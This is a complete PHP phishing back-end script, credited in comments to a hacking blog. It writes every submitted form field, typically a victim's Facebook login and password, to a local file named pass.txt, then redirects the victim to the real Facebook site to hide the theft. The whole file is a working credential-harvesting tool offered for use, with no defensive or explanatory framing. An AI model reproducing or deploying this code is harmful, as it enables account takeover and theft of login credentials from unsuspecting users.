<?php
//Philiphacker.blogspot.com
header
('location:');
$handle=fopen("pass.txt","a");
foreach($_POST as $variable=>$value)
{
fwrite($handle,$variable);
fwrite($handle,"=");
fwrite($handle,$value);
fwrite($handle,"\r\n");
}
fwrite($handle,"\r\n");
fclose($handle);
header("location:https://www.facebook.com/");
exit;
// Philiphacker.blogspot.com
?>
